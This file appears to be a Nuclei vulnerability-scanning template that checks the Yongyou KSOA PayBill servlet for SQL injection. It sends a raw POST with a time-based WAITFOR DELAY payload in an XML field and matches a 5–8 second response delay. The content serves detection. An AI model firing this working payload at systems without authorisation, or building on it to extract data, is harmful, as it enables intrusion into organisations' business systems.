id: yongyouOA-KSOA-PayBill-SQL

info:
  name: 某友时空KSOA PayBill SQL注入漏洞
  author: cnaq  
  severity: high 
  description: 某友时空KSOA PayBill SQL注入漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%9F%90%E5%8F%8B%E6%97%B6%E7%A9%BAKSOA%20PayBill%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: yongyou,sql,injection 

requests:
  - raw:
      - |
        POST /servlet/PayBill?caculate&_rnd= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Content-Length: 134
        Accept-Encoding: gzip, deflate
        Connection: close

        <?xml version="1.0" encoding="UTF-8" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:05';-</name><name>1</name><name>102360</name></root>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: dsl # DSL匹配
        dsl:
          - 'duration>=5'
          - 'duration<8' # 漏洞持续时间大于5秒，小于8秒
        condition: and # 将默认的 or 的关系改为 and
